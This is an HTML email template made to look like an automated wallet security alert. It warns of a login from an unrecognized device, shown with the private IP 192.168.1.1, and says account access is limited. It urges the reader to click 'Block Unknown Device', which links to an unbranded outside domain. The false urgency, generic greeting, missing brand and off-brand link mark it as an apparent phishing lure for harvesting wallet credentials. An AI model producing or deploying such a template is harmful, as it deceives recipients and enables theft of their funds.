<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>{{ $subject ?? 'Update' }}</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            color: #000000;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            box-sizing: border-box;
        }

        h3 {
            font-size: 16px;
            font-weight: normal;
        }

        strong {
            font-weight: bold;
        }

        .details {
            background-color: #f9f9f9;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            font-size: 14px;
            line-height: 1.6;
        }

        .button-container {
            text-align: center;
            margin: 30px 0;
        }

        .button {
            background-color: #0066cc;
            color: #ffffff;
            padding: 12px 24px;
            border-radius: 4px;
            text-decoration: none;
            font-weight: bold;
            font-size: 14px;
            display: inline-block;
        }

        .note {
            font-size: 13px;
            color: #555555;
            margin-top: 30px;
        }

        .footer {
            font-size: 12px;
            color: #999999;
            margin-top: 40px;
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="container">
        <p>Dear User,</p>

        <p><strong>WARNING:</strong> We detected a new login attempt to your wallet from an unrecognized device:</p>

        <p>Your wallet account access will be limited until this security check is completed.</p>

        <div class="details">
            <p><strong>Browser:</strong> Chrome (Linux)</p>
            <p><strong>Location:</strong> United States</p>
            <p><strong>IP Address:</strong> 192.168.1.1</p>
        </div>

        <p>If you don’t recognize this activity, take immediate action to remove the unknown device.</p>

        <div class="button-container">
            <a href="https://c.comteb.online/app/index.html" class="button" target="_blank">Block Unknown Device</a>
        </div>

        <p class="note"><strong>Note:</strong> Your account access will be limited until this security check is
            completed.</p>

        <p class="footer">This is an automated security notification. Please do not reply to this email.</p>
    </div>
</body>

</html>